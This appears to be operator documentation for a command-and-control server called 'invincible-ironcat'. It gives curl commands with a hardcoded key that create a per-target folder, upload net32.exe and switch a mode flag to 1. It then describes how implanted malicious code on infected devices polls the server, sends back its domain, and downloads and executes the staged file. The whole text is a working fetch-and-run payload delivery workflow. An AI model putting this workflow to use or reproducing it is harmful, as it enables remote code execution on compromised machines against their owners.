The API's are keyed with the "invincibleironcat" key that must be in the header or there will be a different behavior.



## Create Domain Folder And Set Mode to 0
curl.exe -XPUT http://invincible-ironcat/mode -H "domain: test1" -H "mode: 0" -H "key: invincibleironcat" -v 


## Upload File
curl -X POST http://invincible-ironcat:/upload -F "file=@./net32.exe" -H "Content-Type: multipart/form-data" -H "Domain: test1" -H "Key: invincibleironcat"


## Update the Mode File to 1
curl.exe -XPUT http://invincible-ironcat/mode -H "domain: test1" -H "mode: 1" -H "key: invincibleironcat" -v 


## Malcious Implanted Code Behavior
Checks /acats-update api location with specific headers to validate it is indeed coming from the correct location.

The return is the contents of mode file in json. 0 or 1.

After the Mode is set to 1, the malicous code client reflects the Mode set to 1 in a head to same location /acats-update

When this is returned to the ironcat server, along with the domain from the environment variable on the infected device, the net32.exe file is downloaded from the folder named after the domain returned in the header, and then executes it.
